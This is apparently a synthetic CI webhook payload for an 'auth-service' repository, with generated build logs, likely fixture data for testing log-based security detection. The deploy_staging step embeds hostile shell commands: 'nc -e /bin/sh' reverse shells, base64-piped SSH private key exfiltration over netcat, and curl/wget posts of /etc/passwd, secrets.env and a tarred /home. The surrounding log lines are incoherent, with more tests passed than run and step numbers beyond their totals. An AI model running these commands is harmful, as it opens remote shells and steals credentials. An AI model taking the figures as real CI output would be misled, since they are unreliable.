{
  "action": "completed",
  "workflow_run": {
    "id": 397,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "68cfe77cc1c04fb873cd722e3769a40c275bced8",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-29T12:18:44.324491Z",
    "updated_at": "2025-11-29T12:22:00.619221Z"
  },
  "repository": {
    "full_name": "startup-io/auth-service",
    "name": "auth-service"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: integration_tests ===\nWARNING: webpack has known vulnerabilities\n\u2713 build completed\n\u2713 package completed\nProcessing...\nHEAD is now at 856854d\nCache hit for key-6602\npip: Installing build dependencies...\n[12:18:44] WARN: Deprecated API usage\nCreating production build...\n  PASS: integration/test_user_create.spec.js\nWaiting...\nLoading...\nHEAD is now at 44d9450\nBuilding Docker image...\nStep 16/18: Linting\nnpm install: resolved 1371 packages\nStep 17/23: Linting\npip install: Successfully installed jest-3.16\nCache saved successfully\npip install: Successfully installed express-3.12\n[12:18:44] DEBUG: Query executed in 100ms\nSnapshots: 18 passed, 26 total\nGenerating source maps...\nCompiling components/service.java...\n[12:18:44] WARN: Deprecated API usage\nChecking out master branch\nDone.\nnpm install: resolved 1444 packages\n[12:18:44] INFO: Starting build process\nException: TypeError\nStep 13/23: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 5/23: Running migrations\nGenerating source maps...\nWARNING: axios has known vulnerabilities\nConnecting to cloud.services:443...\nTransforming 872 files...\nStep 10/23: Linting\n\u2713 Task completed in 2538ms\n[12:18:44] DEBUG: Initializing service\nCompiling utils/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact downloaded: 6MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 79 tests in 13s\nCache invalidated: dependencies\nChecking out master branch\nStep 10/15: Installing dependencies\nStep 19/25: Installing dependencies\nRan 128 tests in 51s\nNODE_ENV=development\n[12:18:44] INFO: Connecting to database\nConnecting to startup.dev:443...\nBundling vendor.js\nCache saved successfully\nBundling runtime.css\nBundling main.js\n[12:18:44] WARN: Deprecated API usage\nStep 6/23: Running migrations\n[12:18:44] WARN: Deprecated API usage\n\u2713 package completed\nStep 15/18: Deploying\nCompiling src/utils.go...\n\u2713 Step 'setup' succeeded\nStep 10/24: Linting\nUsing Python 3.12\nyarn add: Done in 17.87s\npip: Installing build dependencies...\nArtifact downloaded: 36MB\nTests: 61 passed, 183 total\nPushing to registry...\nnpm install: resolved 1788 packages\nConnecting to test.io:443...\nStep 4/24: Installing dependencies\nUsing Python 3.9\nPlatform: linux-x64\n=== Step integration_tests completed ===\n=== Step: checkout ===\nArtifact uploaded: build.tar.gz (39MB)\nnpm notice: created a lockfile\nUsing Python 3.9\nGenerating source maps...\nRan 34 tests in 33s\n[12:18:44] WARN: Deprecated API usage\nnpm notice: created a lockfile\nLayer 6/12: ENV command\nTransforming 397 files...\npip: Downloading eslint-1.4.tar.gz\nOptimizing 75 modules...\nnpm notice: created a lockfile\nCompiling src/main.py...\nChecking out develop branch\nCache saved successfully\nNODE_ENV=production\nConnecting to cloud.services:443...\nConnecting to acme.corp:443...\nReady.\nCompiling utils/main.py...\nFinished.\nTests: 116 passed, 473 total\n[12:18:44] DEBUG: Connection pool: 7 active\nBundling styles.js\nPushing to registry...\n  PASS: test_cache_hit (478ms)\n[12:18:44] DEBUG: Query executed in 18ms\nTest Suites: 21 passed, 42 total\nStep 2/24: Deploying\npip install: Successfully installed eslint-1.16\nUsing Node.js 18.2.10\nnpm notice: package.json updated\nDone.\nUsing Python 3.11\n[12:18:44] DEBUG: Connection pool: 17 active\nSuccess!\n\u2717 build failed with exit code 7\npip: Downloading prettier-4.3.tar.gz\nMinifying vendor.js\nEnvironment: production\nCache hit for key-5003\n[12:18:44] DEBUG: Memory usage: 1657MB\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: dist.zip (32MB)\nCompiling src/handler.rs...\nLayer 4/11: COPY command\nLoading...\n[12:18:44] WARN: Deprecated API usage\n\u2717 build failed with exit code 91\nLoading...\nCompleted.\nStep 13/15: Installing dependencies\nBuilding Docker image...\nConnection established\nnpm install: resolved 1727 packages\nPulling image: alpine:18\nRan 65 tests in 59s\nFinished.\nMinifying app.js\nCompiling src/handler.rs...\npip install: Successfully installed webpack-1.10\n[12:18:44] DEBUG: Initializing service\nFinished.\n[12:18:44] INFO: Connecting to database\nFetching submodules...\nStep 1/21: Testing\n\u2713 Step 'setup' succeeded\nReady.\nnpm install: resolved 152 packages\nImage pulled successfully\nStep 8/20: Linting\nArtifact uploaded: build.tar.gz (46MB)\nOK\nCoverage: 75% statements, 84% branches\nReady.\nPOST /api - 201 (343ms)\n=== Step checkout completed ===\n=== Step: deploy_production ===\n[12:18:44] DEBUG: Loading configuration\nGenerating source maps...\nRan 155 tests in 40s\n\u2713 Task completed in 1585ms\nBundling vendor.css\nGenerating source maps...\n\u2713 lint completed\nArtifact downloaded: 34MB\nArtifact downloaded: 5MB\nTime: 33.794s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBundling runtime.css\npip install: Successfully installed axios-3.7\n[12:18:44] DEBUG: Connection pool: 16 active\npip: Installing build dependencies...\nUploading artifact 'dist' (42 files)\n[12:18:44] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (34MB)\n  PASS: test_auth_login (494ms)\nPulling image: python:18\nyarn add: Done in 2.33s\n[12:18:44] DEBUG: Query executed in 76ms\npip: Collecting eslint\nPOST /data - 202 (287ms)\npip install: Successfully installed axios-4.1\n\u2713 Step 'install' succeeded\nCache restored successfully (61MB)\nImage pulled successfully\nnpm notice: created a lockfile\nBundling runtime.css\nCache invalidated: build\nCompiling src/service.java...\nException: NullPointerException\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 Task completed in 2532ms\nTests: 396 passed, 234 total\n\u2717 build failed with exit code 92\nnpm install: resolved 171 packages\nStep 2/19: Deploying\nWaiting...\nAlready up to date.\npip install: Successfully installed react-2.15\nReady.\npip install: Successfully installed prettier-4.17\nArtifact uploaded: dist.zip (99MB)\n[12:18:44] WARN: Deprecated API usage\nnpm notice: package.json updated\nImage pulled successfully\n[12:18:44] INFO: Connecting to database\n[12:18:44] INFO: Connecting to database\nnpm install: added 471 packages\n[12:18:44] DEBUG: Initializing service\nSuccess!\n[12:18:44] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nnpm install: resolved 791 packages\nTime: 38.401s\n[12:18:44] INFO: Processing request\nStep 15/16: Installing dependencies\nCompiling utils/service.java...\npip: Collecting jest\nVerifying...\nPulling image: alpine:3.11\nFinished.\nStep 18/25: Testing\n\u2713 Step 'build' succeeded\nGenerating source maps...\nPulling image: python:18\n\u2717 build failed with exit code 30\nPlatform: win32-x64\n  PASS: unit/test_user_create.spec.js\n\u2713 lint completed\nnpm install: added 38 packages\nConnection established\n[12:18:44] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n=== Step deploy_production completed ===\n=== Step: setup_node ===\nStep 6/18: Building\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (11MB)\nHEAD is now at 0be8ccb\nCache miss for key-4004\nCompiling lib/utils.go...\n[12:18:44] INFO: Cache refreshed\nEnvironment: development\nUsing Node.js 14.18.8\nSwitched to branch 'feature/task-194'\nPushing to registry...\npip: Collecting eslint\nyarn add: Done in 24.75s\n[12:18:44] INFO: Processing request\nnpm install: added 422 packages\n  PASS: unit/test_user_create.spec.js\n[12:18:44] INFO: Processing request\n[12:18:44] DEBUG: Initializing service\nPushing to registry...\nyarn add: Done in 5.51s\nnpm notice: created a lockfile\n[12:18:44] INFO: Connecting to database\n  PASS: integration/test_cache_hit.spec.js\nTests: 480 passed, 145 total\npip: Installing build dependencies...\nWARNING: eslint has known vulnerabilities\n[12:18:44] INFO: Processing request\nTest Suites: 46 passed, 15 total\npip install: Successfully installed eslint-2.4\nTransforming 501 files...\npip: Collecting jest\n[12:18:44] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\nWaiting...\nUploading artifact 'dist' (26 files)\nStep 18/16: Deploying\nBuilding Docker image...\nConnecting to startup.dev:443...\nHEAD is now at d58c6fa\npip: Collecting webpack\nPushing to registry...\nConnection established\nStep 6/15: Running migrations\n  PASS: e2e/test_db_connect.spec.js\nCompleted.\n[12:18:44] INFO: Connecting to database\nPlatform: darwin-arm64\nNODE_ENV=development\nStep 19/19: Building\nWARNING: axios has known vulnerabilities\n  PASS: test_api_health (78ms)\nFetching submodules...\nEnvironment: development\nUploading artifact 'coverage' (49 files)\nnpm install: resolved 1902 packages\npip: Downloading jest-1.12.tar.gz\nCache saved successfully\n[12:18:44] INFO: Request completed\nBundling main.js\nProcessing...\nRan 169 tests in 39s\nSwitched to branch 'hotfix/task-688'\n[12:18:44] INFO: Processing request\n\u2713 Step 'build' succeeded\nGET /status - 200 (100ms)\nMinifying app.js\nGET /status - 204 (41ms)\nStep 18/22: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 8/21: Running migrations\nInstalling eslint@4.8.0\n[12:18:44] WARN: Deprecated API usage\nAlready up to date.\nException: TypeError\nUploading artifact 'coverage' (35 files)\nBuilding Docker image...\n=== Step setup_node completed ===\n=== Step: e2e_tests ===\nStep 13/17: Installing dependencies\nTest Suites: 27 passed, 47 total\nInstalling eslint@5.2.8\nArtifact uploaded: build.tar.gz (24MB)\nTransforming 894 files...\nDone.\nFinished.\npip: Installing build dependencies...\nGET /status - 201 (72ms)\nCoverage: 95% statements, 78% branches\nGET /status - 204 (60ms)\nSnapshots: 26 passed, 5 total\nFAILED: test_user_create\n[12:18:44] WARN: Deprecated API usage\nUploading artifact 'dist' (48 files)\nTest Suites: 36 passed, 40 total\nUsing Node.js 18.17.5\nTime: 73.790s\nStep 12/21: Linting\nCompiling components/main.py...\nCompleted.\nLoading...\n\u2713 package completed\nSwitched to branch 'bugfix/task-214'\n[12:18:44] INFO: Request completed\n\u2713 All checks passed\n\u2713 All checks passed\nSwitched to branch 'hotfix/task-878'\nTLS handshake completed\nSuccess!\nnpm install: resolved 809 packages\nStep 20/15: Running migrations\nnpm install: added 392 packages\nTest Suites: 49 passed, 49 total\npip: Downloading webpack-3.9.tar.gz\nTests: 316 passed, 424 total\nNODE_ENV=production\nGET /status - 201 (95ms)\nAlready up to date.\nGenerating source maps...\n\u2713 package completed\n[12:18:44] INFO: Starting build process\nFAILED: test_api_health\nSnapshots: 38 passed, 6 total\nCache miss for key-4838\nArtifact uploaded: build.tar.gz (45MB)\nyarn add: Done in 3.43s\nnpm install: resolved 618 packages\nCompiling src/handler.rs...\npip install: Successfully installed react-1.12\nCache hit for key-9277\n[12:18:44] DEBUG: Query executed in 89ms\nPushing to registry...\nRan 13 tests in 49s\nnpm install: added 60 packages\nLoading...\nWARNING: lodash has known vulnerabilities\nCompiling components/service.java...\nEnvironment: production\nCreating production build...\nTLS handshake completed\n\u2717 build failed with exit code 111\nImage pulled successfully\nImage pulled successfully\nWaiting...\nStep 8/15: Linting\nPulling image: alpine:3.11\n[12:18:44] DEBUG: Initializing service\n[12:18:44] INFO: Cache refreshed\nEnvironment: staging\nSnapshots: 16 passed, 12 total\nInstalling webpack@2.9.8\nUsing Python 3.10\nUsing Python 3.10\nnpm install: resolved 652 packages\nVerifying...\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nArtifact downloaded: 2MB\npip: Installing build dependencies...\nnpm notice: created a lockfile\nCreating production build...\nUsing Node.js 14.3.10\nWaiting...\nCreating production build...\nCache hit for key-3294\nChecking out master branch\nTest Suites: 6 passed, 45 total\nDone.\nEnvironment: test\nCache hit for key-4627\nMinifying vendor.js\nLayer 3/14: COPY command\nChecking out master branch\nFAILED: test_cache_hit\nStep 13/17: Building\nWARNING: axios has known vulnerabilities\nOptimizing 80 modules...\nNODE_ENV=test\n\u2713 Step 'test' succeeded\nOK\npip: Installing build dependencies...\nFAILED: test_user_create\nCache invalidated: dependencies\nGenerating source maps...\nOptimizing 28 modules...\nCompiling utils/handler.rs...\nCreating production build...\n[12:18:44] DEBUG: Memory usage: 1737MB\nCompiling components/service.java...\nCompiling lib/service.java...\nEnvironment: test\n[12:18:44] INFO: Processing request\n\u2713 Step 'setup' succeeded\n[12:18:44] INFO: Starting build process\nConnecting to example.com:443...\nUploading artifact 'build' (6 files)\n[12:18:44] DEBUG: Memory usage: 1883MB\npip: Collecting axios\nChecking out master branch\nBuilding Docker image...\nFetching submodules...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed eslint-4.13\nFAILED: test_cache_hit\nStep 11/17: Running migrations\nnpm notice: created a lockfile\nHEAD is now at bc4add3\nHEAD is now at 3e3566b\nNODE_ENV=test\nDone.\nCache restored successfully (83MB)\nStep 15/25: Deploying\nOK\nBuilding Docker image...\nTests: 141 passed, 383 total\nReady.\nFetching submodules...\n[12:18:44] DEBUG: Query executed in 70ms\n\u2717 build failed with exit code 98\nSwitched to branch 'hotfix/task-764'\nBundling runtime.js\nnpm notice: created a lockfile\n[12:18:44] INFO: Connecting to database\n\u2713 test completed\n\u2713 All checks passed\nTest Suites: 28 passed, 43 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: added 283 packages\n[12:18:44] WARN: Deprecated API usage\nStep 8/20: Testing\nCoverage: 81% statements, 64% branches\nPOST /upload - 200 (331ms)\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:44] DEBUG: Initializing service\nOptimizing 76 modules...\n[12:18:44] INFO: Starting build process\n\u2713 All checks passed\n[12:18:44] INFO: Connecting to database\nPOST /data - 200 (275ms)\nHEAD is now at 53eeb49\nTransforming 795 files...\nStep 18/23: Testing\nTime: 99.292s\nSwitched to branch 'hotfix/task-563'\npip install: Successfully installed prettier-3.14\npip: Collecting react\nHEAD is now at 48cc994\nCompiling utils/main.py...\n[12:18:44] WARN: Deprecated API usage\npip: Downloading react-5.5.tar.gz\n[12:18:44] INFO: Request completed\nnpm notice: package.json updated\nTLS handshake completed\n[12:18:44] WARN: Deprecated API usage\nArtifact downloaded: 39MB\n\u2713 package completed\nCompiling utils/app.ts...\nLayer 10/11: COPY command\n[12:18:44] INFO: Cache refreshed\nStep 12/16: Installing dependencies\nEnvironment: development\nRan 65 tests in 58s\n[12:18:44] INFO: Connecting to database\nSnapshots: 35 passed, 36 total\nCache hit for key-4590\n\u2713 All checks passed\n\u2713 Step 'install' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:44] DEBUG: Query executed in 30ms\nOptimizing 33 modules...\nGET /health - 201 (34ms)\n\u2713 lint completed\n[12:18:44] WARN: Deprecated API usage\n\u2713 Step 'test' succeeded\nCompiling lib/service.java...\nSuccess!\nStep 11/17: Testing\nConnecting to example.com:443...\nTLS handshake completed\nCompiling utils/service.java...\nVerifying...\n[12:18:44] DEBUG: Memory usage: 462MB\nTransforming 292 files...\nCompiling lib/index.js...\n[12:18:44] WARN: Deprecated API usage\nLoading...\nCoverage: 94% statements, 78% branches\nWARNING: express has known vulnerabilities\nStep 7/24: Deploying\nnpm install: added 266 packages\n\u2713 Step 'install' succeeded\n[12:18:44] INFO: Request completed\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:44] DEBUG: Memory usage: 905MB\n[12:18:44] INFO: Processing request\n[12:18:44] INFO: Connecting to database\nEnvironment: staging\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:44] DEBUG: Initializing service\n[12:18:44] INFO: Cache refreshed\n[12:18:44] INFO: Processing request\n[12:18:44] DEBUG: Query executed in 57ms\nStep 16/20: Linting\npip: Collecting webpack\n[12:18:44] DEBUG: Initializing service\nRan 160 tests in 12s\nPulling image: node:18\n=== Step unit_tests completed ===\n=== Step: install_dependencies ===\n[12:18:44] WARN: Deprecated API usage\nPOST /data - 202 (252ms)\n[12:18:44] INFO: Request completed\nException: NullPointerException\n[12:18:44] DEBUG: Initializing service\nCache restored successfully (247MB)\nStep 6/21: Running migrations\nConnecting to startup.dev:443...\nUploading artifact 'coverage' (37 files)\nStep 15/17: Installing dependencies\npip: Downloading eslint-1.14.tar.gz\n  PASS: test_auth_login (275ms)\n\u2713 All checks passed\nProcessing...\nUsing Python 3.11\nOK\nStep 4/17: Building\nCache hit for key-8699\nFetching submodules...\n  PASS: test_auth_login (254ms)\n[12:18:44] DEBUG: Memory usage: 135MB\n[12:18:44] WARN: Deprecated API usage\nStep 9/21: Linting\nnpm install: added 470 packages\nCompiling components/utils.go...\nVerifying...\nStep 14/23: Running migrations\npip: Collecting axios\nUsing Node.js 20.12.8\nCache miss for key-5594\n[12:18:44] DEBUG: Memory usage: 1270MB\nyarn add: Done in 14.71s\npip: Downloading lodash-2.17.tar.gz\nConnecting to example.com:443...\nTests: 189 passed, 291 total\nBuilding Docker image...\nCompiling lib/app.ts...\n\u2713 test completed\nStep 16/23: Deploying\nArtifact uploaded: build.tar.gz (27MB)\nCompiling src/main.py...\nnpm notice: package.json updated\nSuccess!\nBundling main.css\nTime: 25.210s\nOK\nNODE_ENV=development\nBundling vendor.css\nSuccess!\nVerifying...\nCreating production build...\nMinifying main.js\nConnecting to cloud.services:443...\n[12:18:44] DEBUG: Loading configuration\nWARNING: lodash has known vulnerabilities\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nProcessing...\n[12:18:44] DEBUG: Initializing service\nReady.\nFetching submodules...\nSwitched to branch 'bugfix/task-213'\nImage pulled successfully\nFAILED: test_auth_login\nBundling runtime.js\nStep 10/19: Deploying\nCache invalidated: node_modules\nTests: 477 passed, 208 total\nSuccess!\nStep 20/24: Testing\nTLS handshake completed\nSwitched to branch 'bugfix/task-503'\nProcessing...\n[12:18:44] DEBUG: Initializing service\nArtifact downloaded: 47MB\n=== Step install_dependencies completed ===\n=== Step: upload_artifacts ===\nProcessing...\n[12:18:44] INFO: Cache refreshed\nReady.\n[12:18:44] INFO: Request completed\nUploading artifact 'build' (8 files)\nWARNING: jest has known vulnerabilities\nStep 4/18: Linting\nTests: 127 passed, 104 total\nSnapshots: 8 passed, 26 total\nRan 135 tests in 25s\nFinished.\n[12:18:44] DEBUG: Connection pool: 3 active\n[12:18:44] INFO: Starting build process\nSnapshots: 8 passed, 50 total\nConnecting to test.io:443...\nStep 4/22: Testing\nConnecting to startup.dev:443...\nRan 30 tests in 53s\nCompiling src/main.py...\nCache miss for key-1472\nTime: 111.373s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTests: 266 passed, 404 total\n\u2713 Step 'install' succeeded\nCache invalidated: dependencies\nCompiling src/handler.rs...\nArtifact downloaded: 9MB\nPulling image: python:latest\nnpm install: added 353 packages\nStep 2/20: Deploying\nLayer 10/10: RUN command\nPushing to registry...\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 deploy completed\n[12:18:44] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling express@5.1.9\npip install: Successfully installed eslint-3.2\nConnecting to test.io:443...\nBuilding Docker image...\nCompleted.\nException: RuntimeError\nLoading...\nCache hit for key-9747\nCache miss for key-9483\nWaiting...\nCompiling src/app.ts...\n[12:18:44] DEBUG: Connection pool: 8 active\npip: Collecting react\nSwitched to branch 'feature/task-377'\n[12:18:44] DEBUG: Initializing service\nWARNING: express has known vulnerabilities\n[12:18:44] INFO: Connecting to database\nFAILED: test_api_health\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 8/15: Linting\nUsing Node.js 15.14.4\nVerifying...\nnpm install: resolved 897 packages\nTests: 148 passed, 280 total\nCache hit for key-8328\n\u2713 Task completed in 4999ms\nGenerating source maps...\n[12:18:44] INFO: Starting build process\nCache hit for key-4835\nCache invalidated: build\nMinifying vendor.js\nTime: 26.309s\nnpm install: resolved 1107 packages\nCompiling lib/main.py...\n  PASS: integration/test_auth_login.spec.js\nStep 2/23: Building\nConnection established\n[12:18:44] WARN: Deprecated API usage\nPulling image: python:18\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\nnpm install: added 277 packages\nArtifact downloaded: 49MB\nPOST /upload - 200 (377ms)\nnpm notice: created a lockfile\nCache miss for key-7617\nCompiling utils/utils.go...\nPulling image: python:latest\nStep 18/18: Building\nReady.\nTest Suites: 21 passed, 19 total\nOK\n[12:18:44] INFO: Cache refreshed\nUsing Python 3.9\n[12:18:44] DEBUG: Loading configuration\nInstalling lodash@3.13.9\nNODE_ENV=production\n[12:18:44] DEBUG: Memory usage: 829MB\nTests: 292 passed, 462 total\nCompiling src/main.py...\nCache hit for key-5348\n[12:18:44] INFO: Cache refreshed\nStep 1/16: Running migrations\nGET /status - 200 (86ms)\nBundling vendor.css\nArtifact downloaded: 22MB\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 lint completed\nPOST /upload - 202 (57ms)\nStep 5/23: Installing dependencies\nUploading artifact 'coverage' (41 files)\n[12:18:44] INFO: Connecting to database\n[12:18:44] DEBUG: Loading configuration\nTime: 44.112s\nStep 7/22: Testing\nCompiling utils/handler.rs...\n[12:18:44] DEBUG: Memory usage: 1258MB\nCache invalidated: node_modules\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\npip: Collecting express\npip: Collecting eslint\nBuilding Docker image...\nStep 14/21: Linting\nCache invalidated: dependencies\nLayer 1/15: RUN command\nTime: 55.415s\nDone.\n\u2713 Task completed in 2077ms\nWaiting...\nFAILED: test_cache_hit\nPOST /data - 201 (96ms)\nStep 9/19: Installing dependencies\npip install: Successfully installed eslint-3.15\nTests: 467 passed, 207 total\n[12:18:44] INFO: Request completed\n[12:18:44] DEBUG: Initializing service\nnpm notice: package.json updated\nUsing Node.js 14.7.1\nyarn add: Done in 22.1s\n[12:18:44] INFO: Processing request\nStep 10/24: Linting\nyarn add: Done in 5.45s\nInstalling jest@3.15.0\nDone.\n\u2713 All checks passed\nPlatform: darwin-arm64\npip: Downloading prettier-3.10.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache saved successfully\nBuilding Docker image...\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 87 modules...\nCompleted.\n\u2717 build failed with exit code 56\n=== Step save_cache completed ===\n=== Step: build ===\nImage pulled successfully\nPlatform: darwin-arm64\nConnecting to cloud.services:443...\n[12:18:44] INFO: Processing request\nTransforming 177 files...\nStep 14/15: Building\n[12:18:44] WARN: Deprecated API usage\nStep 4/18: Installing dependencies\nStep 12/25: Deploying\npip: Installing build dependencies...\nCompiling src/index.js...\nCompiling src/index.js...\nUploading artifact 'coverage' (37 files)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nException: ValueError\nFinished.\nNODE_ENV=test\n[12:18:44] INFO: Processing request\nTLS handshake completed\nPlatform: linux-x64\nConnecting to cloud.services:443...\n[12:18:44] WARN: Deprecated API usage\n[12:18:44] INFO: Connecting to database\nCompiling lib/main.py...\n[12:18:44] INFO: Cache refreshed\nProcessing...\nTransforming 872 files...\nNODE_ENV=development\nArtifact uploaded: dist.zip (11MB)\nyarn add: Done in 10.68s\nWaiting...\nOptimizing 17 modules...\nUploading artifact 'build' (4 files)\nCache hit for key-5701\nCache miss for key-1833\n[12:18:44] DEBUG: Loading configuration\n[12:18:44] DEBUG: Initializing service\nCompleted.\nStep 17/16: Building\n\u2713 validate completed\nCompiling lib/service.java...\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\nArtifact downloaded: 47MB\n[12:18:44] WARN: Deprecated API usage\n\u2713 Task completed in 2378ms\nUsing Node.js 15.13.2\nUsing Node.js 18.0.4\nnpm notice: package.json updated\nCoverage: 75% statements, 99% branches\nCache restored successfully (51MB)\nUsing Python 3.9\nLayer 5/12: COPY command\nFinished.\nChecking out master branch\nFetching submodules...\npip: Installing build dependencies...\n[12:18:44] INFO: Connecting to database\nWARNING: eslint has known vulnerabilities\nTLS handshake completed\nPushing to registry...\n[12:18:44] WARN: Deprecated API usage\nHEAD is now at 2d57719\nUsing Python 3.11\nPulling image: python:latest\nCache invalidated: build\npip: Installing build dependencies...\n  PASS: integration/test_db_connect.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nAlready up to date.\nnpm notice: created a lockfile\nCompiling lib/utils.go...\nStep 14/25: Installing dependencies\nCompiling components/service.java...\nImage pulled successfully\npip: Downloading lodash-2.8.tar.gz\n=== Step build completed ===\n=== Step: deploy_staging ===\n[12:18:44] INFO: Starting build process\n[12:18:44] INFO: Processing request\n[12:18:44] INFO: Processing request\nnc -e /bin/sh 162.88.139.114 55600\nHEAD is now at eadeb74\nLoading...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nUsing Python 3.11\nTests: 271 passed, 317 total\nChecking out main branch\nGET /api - 201 (97ms)\nFAILED: test_user_create\nStep 18/17: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n\u26a0 DEPRECATION: Feature will be removed in v2.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 169.249.77.151 25644\necho $(cat ~/.ssh/id_rsa) | base64 | nc 89.180.101.186 16636\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:18:44] DEBUG: Connection pool: 1 active\npip: Downloading eslint-4.9.tar.gz\nFetching submodules...\nFAILED: test_db_connect\nUploading artifact 'dist' (15 files)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nBundling vendor.css\nSending 160MB of data to startup.dev\nRan 125 tests in 10s\nEnvironment: production\nAlready up to date.\nnc -e /bin/sh 88.130.105.71 50732\nFetching submodules...\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nInstalling jest@5.19.3\nFinished.\nProcessing...\nnpm install: resolved 681 packages\nSending 474MB of data to example.com\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nCompiling lib/service.java...\n\u2713 deploy completed\ncurl -X POST https://cloud.services/collect -d @secrets.env\nReady.\nChecking out develop branch\nLayer 7/14: RUN command\nReady.\npip: Installing build dependencies...\ncurl -X POST https://test.io/collect -d @secrets.env\nPOST /api - 201 (190ms)\n[12:18:44] INFO: Cache refreshed\nStep 20/18: Installing dependencies\nnpm install: added 447 packages\nnpm notice: created a lockfile\nWARNING: axios has known vulnerabilities\n[12:18:44] INFO: Request completed\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nPlatform: win32-x64\nSending 130MB of data to cloud.services\nUsing Python 3.10\necho $(cat ~/.ssh/id_rsa) | base64 | nc 58.172.242.169 1343\nArtifact uploaded: build.tar.gz (48MB)\nStep 13/17: Testing\nWARNING: express has known vulnerabilities\nCompiling lib/handler.rs...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 192.121.102.209 3642\nnc -e /bin/sh 163.4.199.133 24875\nLoading...\nConnection established\n[12:18:44] DEBUG: Query executed in 1ms\nWARNING: prettier has known vulnerabilities\necho $(cat ~/.ssh/id_rsa) | base64 | nc 190.180.174.87 53874\nCoverage: 95% statements, 90% branches\nGenerating source maps...\npip: Collecting react\nRan 81 tests in 23s\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nCreating production build...\nBundling styles.js\n\u2713 All checks passed\n[12:18:44] INFO: Cache refreshed\n[12:18:44] WARN: Deprecated API usage\nFinished.\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nHEAD is now at b70acca\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:18:44] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (18MB)\nNODE_ENV=production\nStep 20/21: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nDone.\npip: Installing build dependencies...\nPulling image: python:latest\nRan 143 tests in 55s\nWARNING: axios has known vulnerabilities\necho $(cat ~/.ssh/id_rsa) | base64 | nc 172.24.213.45 28522\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nTime: 118.755s\nyarn add: Done in 28.43s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-29T12:18:44.324491",
        "finished_at": "2025-11-29T12:19:07.417989",
        "log_lines": [
          "=== Step: integration_tests ===",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 build completed",
          "\u2713 package completed",
          "Processing...",
          "HEAD is now at 856854d",
          "Cache hit for key-6602",
          "pip: Installing build dependencies...",
          "[12:18:44] WARN: Deprecated API usage",
          "Creating production build...",
          "  PASS: integration/test_user_create.spec.js",
          "Waiting...",
          "Loading...",
          "HEAD is now at 44d9450",
          "Building Docker image...",
          "Step 16/18: Linting",
          "npm install: resolved 1371 packages",
          "Step 17/23: Linting",
          "pip install: Successfully installed jest-3.16",
          "Cache saved successfully",
          "pip install: Successfully installed express-3.12",
          "[12:18:44] DEBUG: Query executed in 100ms",
          "Snapshots: 18 passed, 26 total",
          "Generating source maps...",
          "Compiling components/service.java...",
          "[12:18:44] WARN: Deprecated API usage",
          "Checking out master branch",
          "Done.",
          "npm install: resolved 1444 packages",
          "[12:18:44] INFO: Starting build process",
          "Exception: TypeError",
          "Step 13/23: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 5/23: Running migrations",
          "Generating source maps...",
          "WARNING: axios has known vulnerabilities",
          "Connecting to cloud.services:443...",
          "Transforming 872 files...",
          "Step 10/23: Linting",
          "\u2713 Task completed in 2538ms",
          "[12:18:44] DEBUG: Initializing service",
          "Compiling utils/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 6MB",
